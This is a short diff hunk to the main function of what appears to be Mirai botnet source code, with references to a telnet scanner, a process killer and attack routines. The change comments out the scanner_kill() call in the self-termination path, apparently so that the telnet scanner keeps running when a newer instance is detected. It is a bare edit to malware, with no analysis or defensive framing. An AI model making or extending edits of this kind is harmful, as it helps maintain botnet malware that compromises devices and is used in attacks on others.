@@ -222,7 +222,7 @@ int main(int argc, char **args)
             printf("[main] Detected newer instance running! Killing self\n");
 #endif
 #ifdef MIRAI_TELNET
-            scanner_kill();
+            //scanner_kill();
 #endif
             killer_kill();
             attack_kill_all();
